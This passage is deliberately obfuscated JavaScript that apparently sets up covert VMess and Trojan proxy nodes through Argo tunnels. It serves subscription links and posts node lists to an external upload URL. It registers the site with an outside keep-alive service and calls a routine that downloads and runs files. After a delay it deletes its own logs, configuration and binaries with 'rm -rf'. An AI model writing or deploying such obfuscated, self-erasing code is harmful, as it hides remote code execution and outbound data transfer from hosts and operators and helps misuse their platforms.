_0x22565e[_0x5b1cfa(_0x2bc392._0x356b15)][_0x5b1cfa(0x1de)]+'_'+_0x22565e[_0x5b1cfa(0x1d3)]['org'];}catch(_0x4024b2){}}return _0x5b1cfa(_0x2bc392._0x4ce66e);}async function _0x4787ce(_0x25ef3a){const _0x1b9bc1=await _0xdfc490(),_0x490171=NAME?NAME+'-'+_0x1b9bc1:_0x1b9bc1;return new Promise(_0x35d63b=>{const _0x3bf7cc={_0x2bb5fe:0x21d,_0x1cc666:0x268,_0x107b5d:0x20b,_0x203899:0x1e6,_0x125916:0x220,_0x24f067:0x218,_0x18ddc2:0x23e,_0x3703e8:0x237,_0x34ec73:0x1e1,_0x25d132:0x25e};setTimeout(()=>{const _0x476ae0={_0x25b1bc:0x20c,_0x570c12:0x288},_0x5da43c=_0x8b88,_0x7071c={'v':'2','ps':''+_0x490171,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':_0x5da43c(_0x3bf7cc._0x2bb5fe),'net':'ws','type':_0x5da43c(_0x3bf7cc._0x2bb5fe),'host':_0x25ef3a,'path':'/vmess-argo?ed=2560','tls':_0x5da43c(0x23a),'sni':_0x25ef3a,'alpn':'','fp':_0x5da43c(0x232)},_0x262262=_0x5da43c(_0x3bf7cc._0x1cc666)+UUID+'@'+CFIP+':'+CFPORT+_0x5da43c(0x246)+_0x25ef3a+_0x5da43c(_0x3bf7cc._0x107b5d)+_0x25ef3a+_0x5da43c(_0x3bf7cc._0x203899)+_0x490171+'\x0a\x0avmess://'+Buffer[_0x5da43c(_0x3bf7cc._0x125916)](JSON[_0x5da43c(_0x3bf7cc._0x24f067)](_0x7071c))[_0x5da43c(_0x3bf7cc._0x18ddc2)](_0x5da43c(_0x3bf7cc._0x3703e8))+_0x5da43c(_0x3bf7cc._0x34ec73)+UUID+'@'+CFIP+':'+CFPORT+'?security=tls&sni='+_0x25ef3a+_0x5da43c(0x20b)+_0x25ef3a+'&path=%2Ftrojan-argo%3Fed%3D2560#'+_0x490171+_0x5da43c(_0x3bf7cc._0x25d132);console['log'](Buffer[_0x5da43c(0x220)](_0x262262)[_0x5da43c(0x23e)](_0x5da43c(_0x3bf7cc._0x3703e8))),fs[_0x5da43c(0x20e)](subPath,Buffer[_0x5da43c(_0x3bf7cc._0x125916)](_0x262262)['toString'](_0x5da43c(_0x3bf7cc._0x3703e8))),console[_0x5da43c(0x1d8)](FILE_PATH+'/sub.txt\x20saved\x20successfully'),uploadNodes(),app['get']('/'+SUB_PATH,(_0x10b772,_0x4e7bfc)=>{const _0x1194e5=_0x5da43c,_0x575589=Buffer['from'](_0x262262)[_0x1194e5(0x23e)](_0x1194e5(0x237));_0x4e7bfc[_0x1194e5(_0x476ae0._0x25b1bc)](_0x1194e5(_0x476ae0._0x570c12),_0x1194e5(0x201)),_0x4e7bfc[_0x1194e5(0x230)](_0x575589);}),_0x35d63b(_0x262262);},0x7d0);});}}async function uploadNodes(){const _0x5db635={_0xc5df0a:0x27e,_0x3d4f47:0x1db,_0x28e7ca:0x1ec,_0x10ac6f:0x223,_0x286ccb:0x284,_0x4deabf:0x218,_0x58a174:0x25d,_0x3d2e73:0x225},_0x46557f=_0x12ea22;if(UPLOAD_URL&&PROJECT_URL){const _0x44c69b=PROJECT_URL+'/'+SUB_PATH,_0x1bbb21={'subscription':[_0x44c69b]};try{const _0x5b97e6=await axios[_0x46557f(_0x5db635._0xc5df0a)](UPLOAD_URL+_0x46557f(0x24a),_0x1bbb21,{'headers':{'Content-Type':_0x46557f(0x225)}});return _0x5b97e6&&_0x5b97e6[_0x46557f(_0x5db635._0x3d4f47)]===0xc8?(console[_0x46557f(0x1d8)](_0x46557f(_0x5db635._0x28e7ca)),_0x5b97e6):null;}catch(_0x40030f){if(_0x40030f[_0x46557f(0x223)]){if(_0x40030f[_0x46557f(_0x5db635._0x10ac6f)]['status']===0x190){}}}}else{if(UPLOAD_URL){if(!fs[_0x46557f(0x253)](listPath))return;const _0x295805=fs[_0x46557f(_0x5db635._0x286ccb)](listPath,_0x46557f(0x23b)),_0x3a433d=_0x295805[_0x46557f(0x1df)]('\x0a')[_0x46557f(0x1e4)](_0x4a50de=>/(vless|vmess|trojan|hysteria2|tuic):\/\//['test'](_0x4a50de));if(_0x3a433d[_0x46557f(0x204)]===0x0)return;const _0x193b32=JSON[_0x46557f(_0x5db635._0x4deabf)]({'nodes':_0x3a433d});try{const _0x32fda1=await axios[_0x46557f(0x27e)](UPLOAD_URL+_0x46557f(_0x5db635._0x58a174),_0x193b32,{'headers':{'Content-Type':_0x46557f(_0x5db635._0x3d2e73)}});return _0x32fda1&&_0x32fda1['status']===0xc8?(console['log'](_0x46557f(0x258)),_0x32fda1):null;}catch(_0x22429a){return null;}}else return;}}function cleanFiles(){const _0x2eab2d={_0x20a771:0x265,_0x1bc1bd:0x28a},_0x188041={_0x4c7742:0x1d8,_0x3aeb7a:0x243},_0xe3fe6f={_0x4c709c:0x1d8,_0x459a10:0x243,_0x354120:0x275};setTimeout(()=>{const _0x121749=_0x8b88,_0x295bea=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT)_0x295bea[_0x121749(0x250)](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x295bea[_0x121749(0x250)](phpPath);process[_0x121749(_0x2eab2d._0x20a771)]==='win32'?exec(_0x121749(0x22d)+_0x295bea['join']('\x20')+_0x121749(_0x2eab2d._0x1bc1bd),_0x6675f2=>{const _0x350606=_0x121749;console[_0x350606(0x22f)](),console[_0x350606(_0xe3fe6f._0x4c709c)](_0x350606(_0xe3fe6f._0x459a10)),console[_0x350606(0x1d8)](_0x350606(_0xe3fe6f._0x354120));}):exec('rm\x20-rf\x20'+_0x295bea['join']('\x20')+_0x121749(0x251),_0x1a02fc=>{const _0x1d6fb2=_0x121749;console[_0x1d6fb2(0x22f)](),console[_0x1d6fb2(_0x188041._0x4c7742)](_0x1d6fb2(_0x188041._0x3aeb7a)),console[_0x1d6fb2(0x1d8)](_0x1d6fb2(0x275));});},0x15f90);}cleanFiles();async function AddVisitTask(){const _0x5d1799={_0x35c46c:0x1d8,_0x56e35d:0x224,_0x1577eb:0x26e,_0x516252:0x259},_0x22dece=_0x12ea22;if(!AUTO_ACCESS||!PROJECT_URL){console[_0x22dece(_0x5d1799._0x35c46c)](_0x22dece(_0x5d1799._0x56e35d));return;}try{const _0x375827=await axios[_0x22dece(0x27e)]('https://oooo.serv00.net/add-url',{'url':PROJECT_URL},{'headers':{'Content-Type':'application/json'}});return console['log']('automatic\x20access\x20task\x20added\x20successfully'),_0x375827;}catch(_0x354ffb){return console[_0x22dece(_0x5d1799._0x1577eb)](_0x22dece(0x241)+_0x354ffb[_0x22dece(_0x5d1799._0x516252)]),null;}}async function startserver(){try{argoType(),deleteNodes(),cleanupOldFiles(),await generateConfig(),await downloadFilesAndRun(),await extractDomains(),await AddVisitTask();}catch(_0x2dd6f7){console['error']('Error\x20in\x20startserver:',_0x2dd6f7);}}startserver()[_0x12ea22(0x236)](_0x47bf9e=>{const _0x4335f0={_0x2d9d89:0x293},_0x25ff18=_0x12ea22;console[_0x25ff18(0x26e)](_0x25ff18(_0x4335f0._0x2d9d89),_0x47bf9e);}),app[_0x12ea22(0x239)](PORT,()=>console[_0x12ea22(0x1d8)]('http\x20server\x20is\x20running\x20on\x20port:'+PORT+'!'));
